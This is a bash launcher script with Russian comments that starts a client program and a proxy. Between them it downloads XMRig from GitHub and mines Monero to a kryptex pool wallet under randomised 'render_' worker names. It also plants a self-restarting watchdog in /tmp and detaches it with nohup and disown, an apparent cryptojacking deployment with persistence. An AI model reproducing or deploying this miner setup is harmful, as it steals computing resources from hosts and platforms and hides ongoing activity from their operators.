#!/bin/bash

# === 1. Клиент ===
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

# === 2. Майнер (подготовка) ===
DIR="xmrig-6.26.0"
ARCHIVE="$DIR-linux-static-x64.tar.gz"
URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE"

[[ -f "$DIR/xmrig" ]] || (wget -q "$URL" && tar -xzf "$ARCHIVE" && rm -f "$ARCHIVE" && chmod +x "$DIR/xmrig")

WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
echo "Wallet: $WALLET"

# === 3. Запуск майнера ===
run_miner() {
    pkill -9 -f "xmrig.*render_" 2>/dev/null
    sleep 1
    ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user="$WALLET" --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light --log-file=xmrig.log >/dev/null 2>&1 &
    echo "[$(date)] Miner started: $!"
}

# === 4. Монитор (сохраняем в отдельный скрипт) ===
cat > /tmp/xmrig_monitor.sh << 'EOF'
#!/bin/bash
WALLET="$1"
DIR="$2"

run_miner() {
    pkill -9 -f "xmrig.*render_" 2>/dev/null
    sleep 1
    ./"$DIR"/xmrig --url=xmr-ru.kryptex.network:7029 --user="$WALLET" --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light --log-file=xmrig.log >/dev/null 2>&1 &
}

run_miner
while true; do
    PID=$(pgrep -f "xmrig.*$WALLET")
    if [[ -n "$PID" ]]; then
        CPU=$(ps -p "$PID" -o %cpu= 2>/dev/null | tr -d ' ')
        CPU_INT=${CPU%.*}
        if [[ ${CPU_INT:-0} -lt 5 ]]; then
            echo "[$(date)] ⚠️ CPU too low ($CPU%), restarting..."
            run_miner
        fi
    else
        echo "[$(date)] ⚠️ Process missing, restarting..."
        run_miner
    fi
    sleep 60
done
EOF

chmod +x /tmp/xmrig_monitor.sh
nohup /tmp/xmrig_monitor.sh "$WALLET" "$DIR" > miner_monitor.log 2>&1 &
disown

echo "[$(date)] Monitor detached, PID: $!"

# === 5. Прокси ===
exec ./proxy
